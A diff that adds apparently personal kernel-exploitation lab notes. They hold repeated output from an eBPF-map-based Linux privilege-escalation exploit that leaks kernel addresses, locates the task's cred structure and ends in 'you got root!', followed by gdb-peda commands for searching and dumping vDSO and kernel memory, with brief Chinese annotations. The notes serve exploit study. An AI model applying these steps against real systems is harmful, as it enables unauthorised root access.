@@ -1,0 +1,80 @@
+ctrl_mapfd:3, exp_mapfd:4
+[+] leak array_map_ops:0xFFFFFFFF82016480
+[+] leak kernel_base addr:0xFFFFFFFF81000000
+[+] leak exp_map_elem addr:0xFFFF88801F9A4110
+per_cpu_offset: 0xffff88801ea00000
+current_task: 0xffff88801f814b00
+[+] comm: 0x746e6572727563
+com: current
+[+] cred: 0xffff88801f933b40
+[+] you got root!
+
+
+/ $ ./current 
+ctrl_mapfd:3, exp_mapfd:4
+[+] leak array_map_ops:0xFFFFFFFF82016480
+[+] leak kernel_base addr:0xFFFFFFFF81000000
+[+] leak exp_map_elem addr:0xFFFF88801F9C8110
+per_cpu_offset: 0xffff88801ea00000
+current_task: 0xffff88801e6bb200
+[+] comm: 0x746e6572727563
+com: current
+[+] cred: 0xffff88801f8d6180
+[+] you got root!
+
+
+
+/ $ /current
+ctrl_mapfd:3, exp_mapfd:4
+[+] leak array_map_ops:0xFFFFFFFF82016480
+[+] leak kernel_base addr:0xFFFFFFFF81000000
+[+] leak exp_map_elem addr:0xFFFF88801F9A8110
+per_cpu_offset: 0xffff88801ea00000
+current_task: 0xffff88801e693e80
+[+] comm: 0x6161616161616161
+com: aaaaaaaa
+[+] cred: 0xffff88801f968b40
+[+] you got root!
+
+0xffff88801e693e80+ 0x648
+
+报错地址 0xffffffff1e4d76c8
+
+gdb-peda$ x/s 0xffff88801e693e80+ 0x648
+0xffff88801e6944c8:	"aaaaaaaa"
+
+可以使用
+searchmem aaaaaaaa 0xffff88801e6944a0 0xffff88801e6944e0
+searchmem ELF 0xffffffff80000000 0xffffffffffffefff
+0xffffffff80000000  0xffffffffffffefff
+gettimeofday
+
+/ $ ./dump1 
+		  0xffffffffffffefff
+[+]VDSO : 0x7ffd53ff4000
+[+]The offset of gettimeofday is : 2f8
+[+]VDSO : 0x7ffe4738d000
+[+]The offset of gettimeofday is : 2f8
+0x7ffd96acc000
+
+
+
+
+searchmem entiu 0xffffffff80000000 0xffffffff81000168
+
+
+target remote :1234
+x/s 0xffffffff81000000
+x/s 0xffffffff80002000
+x/wx 0xffffffff81000000
+
+//gdb --batch --command=bbb > zijibianyi.txt
+
+
+[+]VDSO : 0x7ffddb9cb000
+[+]The offset of gettimeofday is : 2cd
+
+
+0xffffffff819e3000:	"\177ELF\002\001\001"
+
+dump memory /home/dump 0xffffffff819f3000 0xffffffff819f4000
